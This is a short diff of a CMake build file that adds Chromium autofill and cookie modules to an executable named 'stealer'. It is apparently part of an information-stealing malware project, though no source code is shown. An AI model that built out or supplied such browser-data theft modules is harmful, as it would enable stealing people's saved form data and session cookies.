@@ -82,6 +82,10 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/brownsers/chromium/ChromiumBrowserModule.h
         src/stealer/impl/brownsers/chromium/impl/CBookmarks.cpp
         src/stealer/impl/brownsers/chromium/impl/CBookmarks.h
+        src/stealer/impl/brownsers/chromium/impl/CAutoFill.cpp
+        src/stealer/impl/brownsers/chromium/impl/CAutoFill.h
+        src/stealer/impl/brownsers/chromium/impl/CCookies.cpp
+        src/stealer/impl/brownsers/chromium/impl/CCookies.h
 )
 
 target_link_libraries(stealer
